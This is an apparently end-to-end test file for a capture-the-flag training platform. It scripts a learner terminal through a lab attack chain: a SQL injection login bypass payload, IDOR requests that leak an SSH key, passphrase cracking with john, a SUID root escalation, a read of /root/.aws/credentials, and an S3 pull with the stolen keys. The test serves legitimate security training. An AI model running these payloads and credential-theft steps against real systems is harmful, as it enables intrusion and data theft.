// harness/chains/chainA.test.js
//
// Chain A — challenge-1's "payments" module. One provisioned target +
// workstation container pair carries all three layers in sequence:
//   web (SQLi auth bypass + IDOR)
//     -> in-container privilege escalation (leaked SSH key -> SUID root helper)
//     -> cloud abuse (leaked AWS creds -> LocalStack S3 exfil)
//
// Every step below is driven by literally typing shell commands into the
// same Socket.io terminal channel a human learner uses, and every flag
// assertion waits for the SERVER's own regex scanner to emit
// flag:captured — this harness never calls flag.service.js or reads a
// flag value out of a file/image directly. See the walkthrough delivered
// alongside this file for what a "Pass" here actually proves.

import { describe, it, beforeAll, afterAll, expect } from 'vitest';
import { config } from '../config.js';
import {
  registerLearner,
  resolveSlugIds,
  pollSessionUntilRunning,
  stopSession,
} from '../lib/apiClient.js';
import { TerminalSession, extractJson } from '../lib/terminalSession.js';
import { runStage } from '../lib/stage.js';

const { networkAlias, expectedFlags } = config.chainA;

describe('Chain A — challenge-1 payments module (web -> in-container root -> cloud)', () => {
  let token;
  let ids;        // slug -> numeric challenge id, resolved live off GET /api/challenges
  let sessionId;
  let term;

  beforeAll(async () => {
    // A fresh participant account — see apiClient.js's registerLearner()
    // for why a new one every run. This is infrastructure shared by every
    // chain, not itself one of the four stages the assignment defines.
    ({ token } = await registerLearner());
    ids = await resolveSlugIds(token, config.chainA.moduleSlugs);
  });

  afterAll(async () => {
    // Runs even if a stage threw. This is what stops the ephemeral target
    // + workstation containers and the per-session Docker network
    // (docker.service.js's provision()) from leaking on a failed run.
    term?.close();
    if (sessionId) {
      await stopSession(token, sessionId).catch((err) => {
        console.error(`[Chain A] teardown: DELETE session failed: ${err.message}`);
      });
    }
  }, config.timeouts.sessionRunning);

  it(
    'completes web foothold -> in-container root -> cloud abuse, capturing all six flags',
    async () => {
      const startedAt = Date.now();

      // ---------------------------------------------------------------
      // STAGE 1 — instantiate: provision the module via the real API,
      // attach the real terminal WebSocket, and prove the target is
      // reachable FROM THE WORKSTATION. Never from this test runner's own
      // host — the per-session target has no published port (see
      // docker.service.js's provision(): no PortBindings anywhere), and we
      // never touch the stale docker-compose singleton services either.
      // ---------------------------------------------------------------
      await runStage('1: instantiate + reachability', async () => {
        const entryId = ids[config.chainA.entrySlug];
        const session = await pollSessionUntilRunning(token, entryId);
        sessionId = session.sessionId;
        expect(session.status).toBe('running');

        term = new TerminalSession();
        await term.connect({ token, sessionId, challengeIds: Object.values(ids) });

        // Wait for the workstation's own bash prompt (PS1='\u@\h:\w\$ ',
        // Hostname 'chainbreak-ws', user 'ctf' — server/docker/workstation/
        // Dockerfile) — proves the pty is actually spawned before we type
        // anything at it, not just that the socket connected.
        await term.waitForOutput('ctf@chainbreak-ws', { label: "the workstation's shell prompt" });

        const reach = await term.runCommand(
          `curl -s -o /dev/null -w '%{http_code}' http://${networkAlias}:3000/health`
        );
        expect(reach.output).toContain('200');
      });

      // ---------------------------------------------------------------
      // STAGE 2 — web foothold: OWASP A03 SQL injection auth bypass
      // (challenges/challenge-1/web/app.js POST /login — string-concatenated
      // query, ' OR '1'='1 always matches, admin is row 1 so LIMIT 1
      // returns it), then the resulting admin JWT rides into two OWASP A01
      // broken-access-control endpoints that check authentication but not
      // authorisation. GET /api/users leaks the IDOR flag AND a self-reveal
      // link to a backup manifest; that manifest is what NAMES the leaked
      // SSH key file — we read the filename out of it rather than
      // hardcoding it, the same discovery path a learner follows.
      // ---------------------------------------------------------------
      let adminToken;
      await runStage('2: web foothold (SQLi bypass + IDOR)', async () => {
        // Heredoc, not an inline --data string: the injection payload
        // contains single quotes, and building that as a shell-quoted
        // argument is exactly the quoting hell a quoted heredoc (<<'EOF',
        // no expansion inside) sidesteps entirely. Sent via sendInput
        // directly, not runCommand: a heredoc is multi-line, and
        // runCommand joins its completion marker onto the SAME line with
        // `;` (see its doc comment for why) — which would land inside the
        // heredoc body here instead of after it. `cat` never touches the
        // tty's mode, so simply sending this and then waiting on the NEXT
        // real command is safe — nothing can steal input in between.
        term.sendInput(
          `cat > /home/ctf/login.json <<'EOF'\n{"username":"admin","password":"anything' OR '1'='1"}\nEOF\n`
        );
        const writtenFile = await term.runCommand('cat /home/ctf/login.json');
        expect(writtenFile.output).toContain('anything\' OR \'1\'=\'1');

        const login = await term.runCommand(
          `curl -s -X POST http://${networkAlias}:3000/login -H 'Content-Type: application/json' --data @/home/ctf/login.json`
        );
        // The server's own JSON response is what's printed into the
        // terminal — that alone is enough for the server's flag scanner to
        // catch FLAG_1. We additionally parse it so we can (a) prove the
        // bypass reached an ADMIN row, not just any row, and (b) pull the
        // JWT out for the next two requests.
        const loginBody = extractJson(login.output);
        expect(loginBody.success).toBe(true);
        expect(loginBody.role).toBe('admin');
        expect(loginBody.flag).toBe(expectedFlags['sqli-login']);
        adminToken = loginBody.token;
        await term.waitForFlag(ids['sqli-login']);

        const users = await term.runCommand(
          `curl -s http://${networkAlias}:3000/api/users -H 'Authorization: Bearer ${adminToken}'`
        );
        const usersBody = extractJson(users.output);
        expect(usersBody.users.length).toBeGreaterThan(0);
        expect(usersBody.flag).toBe(expectedFlags['sqli-broken-access']);
        await term.waitForFlag(ids['sqli-broken-access']);

        const manifest = await term.runCommand(
          `curl -s 'http://${networkAlias}:3000/api/admin/backup?file=README.txt' -H 'Authorization: Bearer ${adminToken}'`
        );
        const keyFileMatch = manifest.output.match(/(\S*_key\S*)/);
        expect(keyFileMatch, `Backup manifest did not name a *_key file:\n${manifest.output}`).toBeTruthy();
        const keyFile = keyFileMatch[1];

        await term.runCommand(
          `curl -s 'http://${networkAlias}:3000/api/admin/backup?file=${keyFile}' -H 'Authorization: Bearer ${adminToken}' -o /home/ctf/paymentsvc_key`
        );
        // SSH refuses to use a private key file with group/other
        // permissions bits set — the download above lands with whatever
        // umask curl uses, so this is a required step, not belt-and-braces.
        const chmod = await term.runCommand('chmod 600 /home/ctf/paymentsvc_key');
        expect(chmod.exitCode).toBe(0);
      });

      // ---------------------------------------------------------------
      // STAGE 3 — in-container privilege escalation (NOT a host/container
      // escape: this platform has no host breakout anywhere in either
      // module — see the investigation notes). Crack the leaked key's
      // passphrase with john (the workstation ships a Jumbo build
      // specifically for ssh2john's SSH-key format support, plus a
      // curated wordlist), use it to open a REAL interactive SSH login —
      // a login shell is required, since only a login shell sources
      // .bash_profile, which is where FLAG_SSH_PIVOT is printed
      // (entrypoint.sh) — then run the root-owned SUID helper to become
      // root. Root is proven independently via `id`, not merely inferred
      // from a flag appearing.
      // ---------------------------------------------------------------
      let awsAccessKeyId;
      let awsSecretAccessKey;
      await runStage('3: crack SSH key -> pivot -> SUID privesc to root', async () => {
        await term.runCommand('ssh2john /home/ctf/paymentsvc_key > /home/ctf/key.hash');

        // The slow step — given its own budget (config.timeouts.passwordCrack)
        // rather than the default per-command timeout. john exits on its
        // own once its one loaded hash is cracked, so this returns as soon
        // as that happens rather than running to the end of the wordlist.
        await term.runCommand(
          `john --wordlist=/usr/share/wordlists/rockyou.txt /home/ctf/key.hash`,
          { timeoutMs: config.timeouts.passwordCrack }
        );
        const shown = await term.runCommand('john --show /home/ctf/key.hash');
        // We don't assume the passphrase in advance — we read back
        // whatever john actually recovered from its own results.
        const crackedMatch = shown.output.match(/paymentsvc_key:(\S+)/);
        expect(crackedMatch, `john did not report a cracked passphrase:\n${shown.output}`).toBeTruthy();
        const passphrase = crackedMatch[1];

        // Strip the passphrase from the key so the SSH login below can run
        // over this same scripted channel without racing an interactive
        // passphrase prompt on the pty.
        const reencrypt = await term.runCommand(
          `ssh-keygen -p -P '${passphrase}' -N '' -f /home/ctf/paymentsvc_key`
        );
        expect(reencrypt.exitCode).toBe(0);

        // A REAL interactive login (no trailing remote command) — this has
        // no "command finished" moment of its own, so it's sent raw and we
        // wait for the remote shell's prompt instead of runCommand's
        // marker trick (which needs the CURRENT shell to still be alive to
        // echo the tag back, and this command replaces it with a new one).
        term.sendInput(
          `ssh -i /home/ctf/paymentsvc_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null paymentsvc@${networkAlias}\n`
        );
        await term.waitForOutput(`paymentsvc@${networkAlias}`, { label: 'the paymentsvc SSH login prompt' });
        // Printed by .bash_profile on login itself — confirms we actually
        // got a LOGIN shell, not merely an authenticated connection.
        const sshPivotFlag = await term.waitForFlag(ids['sqli-ssh-pivot']);
        expect(sshPivotFlag.flag).toBe(expectedFlags['sqli-ssh-pivot']);

        // From here on, every runCommand call executes on the TARGET
        // container as paymentsvc, over the same pty, via the SSH session
        // just opened — runCommand doesn't need to know that.
        const whoami = await term.runCommand('whoami');
        expect(whoami.output).toContain('paymentsvc');

        // The actual escalation: exec the root-owned SUID binary
        // (backup-helper.c — setuid(0)/setgid(0), resets HOME, execs a
        // fresh LOGIN bash). Same "no return, wait for the new prompt"
        // shape as the SSH login above.
        term.sendInput('/usr/local/bin/backup-helper\n');
        await term.waitForOutput(`root@${networkAlias}`, { label: 'the escalated root shell prompt' });

        // Positive proof of root — the actual requirement this stage
        // exists to satisfy. A privilege check, not a flag string.
        const id = await term.runCommand('id');
        expect(id.output).toMatch(/uid=0\(root\)/);

        const flagFile = await term.runCommand('cat /root/flag.txt');
        expect(flagFile.exitCode).toBe(0); // would be "Permission denied" (mode 600) as paymentsvc
        expect(flagFile.output).toContain(expectedFlags['sqli-privesc-root']);
        await term.waitForFlag(ids['sqli-privesc-root']);

        const creds = await term.runCommand('cat /root/.aws/credentials');
        expect(creds.output).toContain(expectedFlags['sqli-docker-misconfig']);
        await term.waitForFlag(ids['sqli-docker-misconfig']);
        const accessKeyMatch = creds.output.match(/aws_access_key_id\s*=\s*(\S+)/);
        const secretKeyMatch = creds.output.match(/aws_secret_access_key\s*=\s*(\S+)/);
        expect(accessKeyMatch && secretKeyMatch, `Could not parse leaked AWS creds:\n${creds.output}`).toBeTruthy();
        awsAccessKeyId = accessKeyMatch[1];
        awsSecretAccessKey = secretKeyMatch[1];

        // Unwind back to the workstation's own shell. The TARGET container
        // is deliberately NOT attached to the LocalStack network (only the
        // workstation is — see docker.service.js's provision()), so stage
        // 4's cloud call has to run from here, not from this root shell.
        // `exit` has no "next command on this same line" moment (like the
        // ssh/backup-helper commands above), so it's sent raw too.
        term.sendInput('exit\n'); // root shell (backup-helper's bash -l) -> paymentsvc's SSH shell
        await term.waitForOutput(`paymentsvc@${networkAlias}`, { label: 'return to the paymentsvc shell' });
        term.sendInput('exit\n'); // paymentsvc's SSH shell -> the SSH connection closes
        await term.waitForOutput('ctf@chainbreak-ws', { label: 'return to the workstation shell' });

        const backHome = await term.runCommand('whoami');
        expect(backHome.output).toContain('ctf');
      });

      // ---------------------------------------------------------------
      // STAGE 4 — cloud abuse: the AWS creds leaked in stage 3 are real
      // against the platform's shared LocalStack instance
      // (LocalStack/seed-iam.py plants them on a genuine 'deploy-bot' IAM
      // identity there). This bucket and flag are NOT per-session —
      // LocalStack is one shared instance for the whole platform (see the
      // investigation notes) — so this proves the credential chain works,
      // not per-learner cloud isolation.
      // ---------------------------------------------------------------
      await runStage('4: cloud abuse via leaked deploy-bot creds', async () => {
        const s3 = await term.runCommand(
          `AWS_ACCESS_KEY_ID=${awsAccessKeyId} AWS_SECRET_ACCESS_KEY=${awsSecretAccessKey} AWS_DEFAULT_REGION=us-east-1 ` +
          `aws --endpoint-url=http://localstack:4566 s3 cp s3://acme-payments-backups/flag.txt -`
        );
        expect(s3.exitCode).toBe(0);
        expect(s3.output).toContain(expectedFlags['sqli-iam-exfil']);
        await term.waitForFlag(ids['sqli-iam-exfil']);
      });

      // END-TO-END wall clock: registration + provisioning the target and
      // workstation containers + every round trip over the socket + the
      // SSH-key crack — NOT isolated exploit-only time. Reported this way
      // deliberately, because "how long does the whole chain take a
      // learner, platform included" is the number Chapter 5.2.1 needs.
      const elapsedMs = Date.now() - startedAt;
      console.log(`\n[Chain A] end-to-end wall-clock time: ${elapsedMs}ms`);
    },
    config.timeouts.chainOverall
  );
});
